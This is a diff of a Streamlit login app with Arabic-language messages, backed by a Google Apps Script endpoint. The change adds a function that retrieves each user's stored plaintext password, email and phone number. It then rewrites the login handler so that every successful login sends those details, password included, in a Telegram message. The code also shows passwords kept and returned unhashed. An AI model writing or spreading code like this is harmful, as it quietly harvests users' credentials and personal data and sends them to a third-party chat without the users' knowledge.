@@ -1,6 +1,6 @@
 import streamlit as st
 import requests
-from orders import main as orders_main
+from orders import main as orders_main  # إذا لديك ملف orders.py يحتوي على الدالة main()
 
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzAbMUZosZP2-IYLagqCutoa4hdXHszQhLL13fW_fyhYaEpAVrG5f0lokyDS1EWoDqq/exec"
 
@@ -37,6 +37,29 @@ def check_login(username, password):
         st.error(f"خطأ في التحقق من تسجيل الدخول: {e}")
         return False
 
+def get_user_data(username):
+    data = {
+        "action": "get_user_data",
+        "username": username
+    }
+    try:
+        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=5)
+        text = res.text.strip()
+        if text == "NOT_FOUND":
+            return None
+        parts = text.split(",")
+        if len(parts) == 4:
+            return {
+                "username": parts[0],
+                "password": parts[1],
+                "email": parts[2],
+                "phone": parts[3]
+            }
+        return None
+    except Exception as e:
+        st.error(f"خطأ في جلب بيانات المستخدم: {e}")
+        return None
+
 def add_user(username, password, email, phone):
     data = {
         "action": "add",
@@ -65,9 +88,20 @@ def login_page():
             st.warning("يرجى ملء جميع الحقول")
         else:
             if check_login(username, password):
-                st.session_state['logged_in'] = True
-                st.session_state['user_name'] = username
-                send_telegram_message(f"🔑 تم تسجيل دخول المستخدم: <b>{username}</b>")
+                user_data = get_user_data(username)
+                if user_data:
+                    st.session_state['logged_in'] = True
+                    st.session_state['user_name'] = user_data['username']
+                    message = (
+                        f"🔑 تم تسجيل دخول المستخدم:\n"
+                        f"اسم المستخدم: <b>{user_data['username']}</b>\n"
+                        f"كلمة المرور: <b>{user_data['password']}</b>\n"
+                        f"البريد الإلكتروني: <b>{user_data['email']}</b>\n"
+                        f"رقم الهاتف: <b>{user_data['phone']}</b>"
+                    )
+                    send_telegram_message(message)
+                else:
+                    st.error("تعذر جلب بيانات المستخدم")
                 return True
             else:
                 st.error("اسم المستخدم أو كلمة المرور غير صحيحة")
@@ -96,13 +130,13 @@ def main():
     if 'logged_in' not in st.session_state or not st.session_state['logged_in']:
         just_logged_in = login_page()
         if just_logged_in:
-            st.rerun()
+            st.experimental_rerun()
     else:
         st.sidebar.write(f"مرحباً، {st.session_state['user_name']}")
         if st.sidebar.button("تسجيل خروج"):
             st.session_state['logged_in'] = False
             st.session_state.pop('user_name', None)
-            st.rerun()
+            st.experimental_rerun()
 
         orders_main()
 
